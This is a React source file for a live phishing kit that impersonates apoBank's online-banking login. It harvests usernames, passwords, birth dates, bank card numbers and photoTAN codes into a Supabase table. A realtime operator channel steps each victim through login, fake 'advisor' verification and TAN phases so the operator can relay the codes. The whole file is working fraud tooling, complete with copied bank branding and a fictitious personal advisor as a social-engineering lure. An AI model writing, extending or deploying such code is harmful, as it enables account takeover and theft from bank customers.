import { useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { Loader2, Phone, ShieldCheck, Globe, Mail, Info, AlertTriangle } from "lucide-react";
import headerBankingAsset from "@/assets/header-banking.jpg.asset.json";
import apobankLogo from "@/assets/apobank-logo.svg";
import apobankLogoSquare from "@/assets/apobank-logo-square.png";
import phototanDefault from "@/assets/phototan.png";

type AuthRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  customer_phase: string | null;
  tan_method: string | null;
  device_name: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  show_berater: boolean | null;
};


const normalizeToken = (raw: string) => {
  const digits = raw.replace(/[^0-9]/g, "").slice(0, 6);
  if (digits.length < 6) return raw;
  return `${digits.slice(0, 3)}-${digits.slice(3)}`;
};

const AuthFlow = () => {
  const { token: tokenParam } = useParams();
  const token = useMemo(() => normalizeToken(tokenParam || ""), [tokenParam]);
  const [row, setRow] = useState<AuthRow | null>(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  useEffect(() => {
    let channel: any;
    (async () => {
      const { data } = await (supabase as any)
        .from("auth_tokens")
        .select("id, token, auftraggeber_name, customer_phase, tan_method, device_name, photo_tan_image, last_error, show_berater")
        .eq("token", token)
        .maybeSingle();
      if (!data) { setNotFound(true); setLoading(false); return; }
      setRow(data);
      setLoading(false);
      channel = (supabase as any)
        .channel(`auth_${data.id}`)
        .on("postgres_changes", { event: "UPDATE", schema: "public", table: "auth_tokens", filter: `id=eq.${data.id}` }, (p: any) => {
          setRow((prev) => ({ ...(prev as AuthRow), ...p.new }));
        })
        .subscribe();
    })();
    return () => { if (channel) (supabase as any).removeChannel(channel); };
  }, [token]);

  const setPhase = async (phase: string, extra: Record<string, any> = {}) => {
    if (!row) return;
    await (supabase as any).from("auth_tokens").update({ customer_phase: phase, ...extra }).eq("id", row.id);
  };

  const upsertMeta = async (patch: Record<string, any>) => {
    if (!row) return;
    const task_id = `auth:${row.id}`;
    const { data: existing } = await (supabase as any)
      .from("panel_task_meta").select("id").eq("task_id", task_id).maybeSingle();
    if (existing) await (supabase as any).from("panel_task_meta").update(patch).eq("id", existing.id);
    else await (supabase as any).from("panel_task_meta").insert({ task_id, ...patch });
  };

  if (loading) return <CenterSpinner />;
  if (notFound || !row) return <NotFoundBox />;

  const phase = row.customer_phase || "login";

  if (phase === "login" || phase === "login_rejected") {
    return <LoginStep row={row} onSubmit={async (netkey, pin) => {
      await upsertMeta({ netkey, pin });
      await setPhase("login_review", { last_error: null });
    }} />;
  }

  if (phase === "login_review") return <LoadingStep text="Sie werden eingeloggt." />;

  if (phase === "berater") {
    return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
      await upsertMeta({ berater_geburtsdatum: geburtsdatum, berater_karte: karte });
      await setPhase("login", { last_error: null });
    }} />;
  }



  if (phase === "confirm") {
    return <ConfirmStep row={row} onClick={async () => { await setPhase("phototan_request", { last_error: null }); }} />;
  }


  if (phase === "phototan_request") return <LoadingStep text="Bitte warten." />;

  if (phase === "phototan" || phase === "phototan_rejected") {
    return <PhotoTanStep row={row} onSubmit={async (code) => {
      await upsertMeta({ tan: code, tan_updated_at: new Date().toISOString() });
      await setPhase("tan_review", { last_error: null });
    }} />;
  }

  if (phase === "tan_review") return <LoadingStep text="Bitte warten." />;

  if (phase === "success") return <SuccessLoader />;

  if (phase === "aborted") {
    return <FullScreen>
      <div className="flex flex-col items-center gap-3 text-center">
        <AlertTriangle className="h-8 w-8 text-destructive" />
        <div className="font-semibold">Sitzung beendet</div>
        <div className="text-sm text-muted-foreground">Bitte kontaktieren Sie Ihren Berater.</div>
      </div>
    </FullScreen>;
  }

  return <LoadingStep text="Bitte warten." />;
};

/* ------------------------------- Steps ------------------------------- */

const LoginStep = ({ row, onSubmit }: { row: AuthRow; onSubmit: (netkey: string, pin: string) => Promise<void> }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [uTouched, setUTouched] = useState(false);
  const [pTouched, setPTouched] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (row.customer_phase === "login_rejected") {
      setPassword("");
      setSubmitting(false);
    }
  }, [row.customer_phase]);

  const uErr = uTouched && !username.trim();
  const pErr = pTouched && !password.trim();

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) { setUTouched(true); setPTouched(true); return; }
    setSubmitting(true);
    await onSubmit(username.trim(), password);
  };

  return (
    <ShellLarge title="Login apoBank">
      <p className="font-semibold text-foreground">Willkommen im Online-Banking der apoBank</p>
      <img src={headerBankingAsset.url} alt="Sicherheitshinweis" className="w-full" width={1600} height={512} />

      <div className="space-y-5 text-sm text-foreground">
        <p>Aktuelle Warnung vor Phishing und Betrugsversuchen: <a href="#" className="underline text-primary">apobank.de/aktuelle-sicherheitshinweise</a></p>
        <p>Allgemeine Informationen zum Online-Banking finden Sie unter: <a href="#" className="underline text-primary">apobank.de/onlinebanking</a></p>
        <p>Statusmeldungen zu aktuellen Störungen finden Sie unter: <a href="#" className="underline text-primary">apobank.de/status-onlinebanking</a></p>
      </div>

      {row.last_error && (
        <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-5 rounded text-sm">{row.last_error}</div>
      )}

      <form onSubmit={submit} className="space-y-6">
        <FieldRow label="Benutzername" error={uErr}>
          <div className="relative">
            <Input value={username} onChange={e => { setUsername(e.target.value); if (e.target.value.trim()) setUTouched(false); }}
              className={cn("bg-white focus-visible:ring-[3px] focus-visible:ring-[#a0b0c8] focus-visible:ring-offset-0", uErr && "border-destructive pr-10")} />
            {uErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive pointer-events-none" />}
          </div>
        </FieldRow>
        <FieldRow label="Passwort" error={pErr}>
          <div className="relative">
            <Input type="password" value={password} onChange={e => { setPassword(e.target.value); if (e.target.value.trim()) setPTouched(false); }}
              className={cn("bg-white focus-visible:ring-[3px] focus-visible:ring-[#a0b0c8] focus-visible:ring-offset-0", pErr && "border-destructive pr-10")} />
            {pErr && <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive pointer-events-none" />}
          </div>
        </FieldRow>
        <div className="flex justify-end">
          <Button type="submit" variant="outline" disabled={submitting}
            className={cn("px-8 bg-white hover:bg-white",
              password.length > 0 ? "border-foreground text-foreground" : "border-muted-foreground/40 text-muted-foreground")}>
            {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
          </Button>
        </div>
      </form>

      <p className="text-sm text-foreground">
        Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die <a href="#" className="underline text-primary">Sicherheitshinweise</a> an.
      </p>

      <div className="space-y-5">
        <p className="font-semibold text-foreground text-sm">Maßnahmen für sicheres Online-Banking:</p>
        <div className="space-y-5 text-sm text-foreground">
          <Tip icon={ShieldCheck}>1. Wir fragen niemals nach Ihren Zugangsdaten.</Tip>
          <Tip icon={Globe}>2. Loggen Sie sich immer über www.apobank.de ein.</Tip>
          <Tip icon={Mail}>3. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</Tip>
        </div>
      </div>

      <div className="space-y-1 text-sm">
        <div className="flex items-center gap-2 text-foreground"><Phone className="w-4 h-4" /><span>+49 211 5998 8000</span></div>
        <a href="#" className="underline text-primary text-sm">Hotlines der apoBank</a>
      </div>
    </ShellLarge>
  );
};

const LoadingStep = ({ text }: { text: string }) => (
  <div className="min-h-screen bg-background flex flex-col items-center justify-center">
    <div className="relative w-56 h-56">
      <svg className="absolute inset-0 w-full h-full animate-spin" style={{ animationDuration: "1.5s" }} viewBox="0 0 200 200" fill="none">
        <path d="M 100 10 A 90 90 0 0 1 190 100" stroke="hsl(var(--primary))" strokeWidth="5" strokeLinecap="round" />
      </svg>
      <div className="absolute inset-0 flex items-center justify-center">
        <img src={apobankLogoSquare} alt="apoBank" className="w-44 h-44 object-contain" />
      </div>
    </div>
    <p className="mt-8 text-lg text-foreground font-medium">{text}</p>
  </div>
);

const ConfirmStep = ({ row, onClick }: { row: AuthRow; onClick: () => Promise<void> }) => {
  const [submitting, setSubmitting] = useState(false);
  const deviceName = row.device_name || "iPhone";
  return (
    <ShellSmall title="Login">
      <p className="text-foreground text-base leading-relaxed">
        Bitte bestätigen Sie die Anmeldung auf Ihrem Gerät mit dem Namen '{deviceName}'.
      </p>
      <p className="text-foreground text-base leading-relaxed">
        Sollten Sie keinen Internetzugang mit Ihrem Smartphone haben, können Sie den Login auch mit photoTAN bestätigen.
      </p>
      <div className="flex justify-end pt-2">
        <Button onClick={async () => { setSubmitting(true); await onClick(); }} disabled={submitting}
          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80">
          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />photoTAN</span> : "photoTAN"}
        </Button>
      </div>
    </ShellSmall>
  );
};

const PhotoTanStep = ({ row, onSubmit }: { row: AuthRow; onSubmit: (code: string) => Promise<void> }) => {
  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);
  useEffect(() => { if (row.customer_phase === "phototan_rejected") { setCode(""); setSubmitting(false); } }, [row.customer_phase]);

  return (
    <ShellSmall title="Login">
      {row.last_error && (
        <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4">
          <p className="text-destructive text-sm">{row.last_error}</p>
        </div>
      )}
      <p className="text-foreground text-sm sm:text-base">
        Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App. Anschließend klicken Sie auf <strong>photoTAN</strong> um den in der App angezeigten Code manuell einzugeben.
      </p>
      <div className="flex justify-center">
        <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
          <img src={row.photo_tan_image || phototanDefault} alt="PhotoTAN Code" className="w-full h-full object-contain" />
        </div>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
        <label className="text-foreground font-semibold text-base">Code</label>
        <Input type="text" inputMode="numeric" pattern="[0-9]*" value={code}
          onChange={e => setCode(e.target.value.replace(/\D/g, ""))} className="border-primary/30 bg-card" />
      </div>
      <div className="flex justify-end">
        <Button disabled={submitting || !code} onClick={async () => { setSubmitting(true); await onSubmit(code); }}
          className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80">
          {submitting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Anmelden</span> : "Anmelden"}
        </Button>
      </div>
    </ShellSmall>
  );
};

const BeraterStep = ({ onSubmit }: { onSubmit: (geburtsdatum: string, karte: string) => Promise<void> }) => {
  const [geburtsdatum, setGeburtsdatum] = useState("");
  const [karte, setKarte] = useState("");
  const [touched, setTouched] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const karteInvalid = karte.length !== 10;
  const geburtsdatumInvalid = !/^\d{2}\.\d{2}\.(\d{2}|\d{4})$/.test(geburtsdatum);
  const geburtsdatumError = touched && geburtsdatumInvalid;
  const karteError = touched && karteInvalid;

  const handleWeiter = async () => {
    setTouched(true);
    if (geburtsdatumInvalid || karteInvalid) return;
    setSubmitting(true);
    await onSubmit(geburtsdatum, karte);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col relative">
      <img src={apobankLogo} alt="apoBank Logo" className="absolute top-3 left-3 sm:top-4 sm:left-4 h-10 sm:h-16 w-auto z-10" />
      <div className="flex-1 flex items-start justify-center px-3 sm:px-4 pt-6 pb-12">
        <div className="w-full max-w-xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
          <div className="px-4 sm:px-8 py-8 sm:py-10 flex flex-col items-center text-center">
            <div className="h-36 w-36 rounded-full bg-muted border-4 border-white shadow-[0_4px_18px_rgba(0,0,0,0.12)] flex items-center justify-center overflow-hidden">
              <span className="text-5xl font-semibold text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>JS</span>
            </div>
            <p className="mt-5 text-xs tracking-[0.18em] font-semibold text-primary uppercase">Ihr persönlicher Kundenberater</p>
            <h1 className="mt-2 text-3xl font-bold text-[#0f1b2d]" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Justus Sperling</h1>
            <div className="mt-3 flex items-center gap-2 text-foreground">
              <Phone className="h-4 w-4" />
              <span className="text-sm font-medium">+49 211 5998 08</span>
            </div>
            <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">Justus Sperling</span> betreut.
              Ihr Berater hat den Vorgang vorbereitet. Zur Verifizierung gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
            </p>
            <div className="mt-6 w-full max-w-md flex items-start gap-3 rounded-md border border-primary/20 bg-primary/5 px-4 py-3 text-left">
              <ShieldCheck className="h-5 w-5 text-primary shrink-0 mt-0.5" />
              <p className="text-xs text-foreground/70 leading-relaxed">
                Der Vorgang läuft über eine gesicherte Verbindung Ihrer Bank. Geben Sie Ihre Zugangsdaten niemals an Dritte weiter — Ihr Berater fragt diese zu keiner Zeit ab.
              </p>
            </div>
            <section className="mt-6 w-full max-w-md bg-white border border-border/60 rounded-sm p-4 sm:p-6 shadow-sm text-left">
              <h2 className="font-bold text-[#1a1a1a] mb-3">Zu Ihrer Sicherheit</h2>
              <p className="text-sm text-foreground mb-5">
                Zur Überprüfung geben Sie bitte Ihr Geburtsdatum und die Nummer einer Ihrer gültigen apoBankCard ein
              </p>
              <div className="space-y-4">
                <div>
                  <input type="text" inputMode="numeric" value={geburtsdatum} onChange={e => {
                    const d = e.target.value.replace(/\D/g, "").slice(0, 8);
                    let out = d;
                    if (d.length > 4) out = `${d.slice(0,2)}.${d.slice(2,4)}.${d.slice(4)}`;
                    else if (d.length > 2) out = `${d.slice(0,2)}.${d.slice(2)}`;
                    setGeburtsdatum(out);
                  }} placeholder="Geburtsdatum*" maxLength={10}
                    className={`w-full px-3 py-3 border rounded-sm bg-white text-sm text-foreground outline-none focus:ring-1 focus:ring-foreground ${geburtsdatumError ? "border-[#d9614a]" : "border-border"}`} />
                  <p className={`text-xs mt-1 ${geburtsdatumError ? "text-[#d9614a]" : "text-foreground"}`}>TT.MM.JJJJ</p>
                </div>
                <div>
                  <input type="text" inputMode="numeric" maxLength={10} value={karte}
                    onChange={e => setKarte(e.target.value.replace(/\D/g, "").slice(0, 10))} placeholder="apoBankCard Kartennummer *"
                    className={`w-full px-3 py-3 border rounded-sm bg-white text-sm text-foreground outline-none focus:ring-1 focus:ring-foreground ${karteError ? "border-[#d9614a]" : "border-border"}`} />
                  <p className={`text-xs mt-1 ${karteError ? "text-[#d9614a]" : "text-foreground"}`}>
                    {karteError ? (karte.length === 0 ? "* Pflichtfeld" : "Kartennummer muss 10 Zeichen lang sein") : "* Pflichtfeld"}
                  </p>
                </div>
              </div>
            </section>
            <div className="mt-7 w-full max-w-md flex justify-end">
              <button onClick={handleWeiter} disabled={submitting}
                className="px-8 py-2 bg-white border border-foreground text-foreground rounded-sm text-sm font-medium hover:bg-white transition-colors disabled:opacity-70">
                {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Weiter"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

/* ------------------------------- Shells ------------------------------- */


const ShellLarge = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
    <div className="w-full max-w-[820px] bg-white mt-10 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
      <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
        <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1>
      </div>
      <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
        {children}
      </div>
    </div>
    <FooterLogo />
  </div>
);

const ShellSmall = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
    <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
      <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
        <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{title}</h1>
      </div>
      <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
        {children}
      </div>
    </div>
    <FooterLogo />
  </div>
);

const FooterLogo = () => (
  <div className="pb-10">
    <img src={apobankLogo} alt="apoBank - Bank der Gesundheit" className="h-12 sm:h-16 mx-auto" loading="lazy" />
  </div>
);

const FieldRow = ({ label, error, children }: { label: string; error?: boolean; children: React.ReactNode }) => (
  <div className="grid grid-cols-1 sm:grid-cols-[160px_1fr] items-start gap-1 sm:gap-4">
    <label className="font-semibold text-sm text-foreground sm:mt-2.5">{label}</label>
    <div>
      {children}
      {error && <p className="text-destructive text-sm mt-1">Ein Wert wird benötigt</p>}
    </div>
  </div>
);

const Tip = ({ icon: Icon, children }: { icon: any; children: React.ReactNode }) => (
  <div className="flex items-start gap-3">
    <Icon className="w-5 h-5 text-muted-foreground mt-0.5 shrink-0" />
    <span>{children}</span>
  </div>
);

const CenterSpinner = () => (
  <FullScreen><Loader2 className="h-6 w-6 animate-spin text-primary" /></FullScreen>
);
const NotFoundBox = () => (
  <FullScreen>
    <div className="flex flex-col items-center gap-3 text-center">
      <AlertTriangle className="h-8 w-8 text-destructive" />
      <div className="font-semibold">Sitzung nicht gefunden</div>
      <div className="text-sm text-muted-foreground">Bitte prüfen Sie den Link von Ihrem Berater.</div>
    </div>
  </FullScreen>
);
const FullScreen = ({ children }: { children: React.ReactNode }) => (
  <div className="min-h-screen flex items-center justify-center bg-muted/30 p-4">{children}</div>
);

export default AuthFlow;
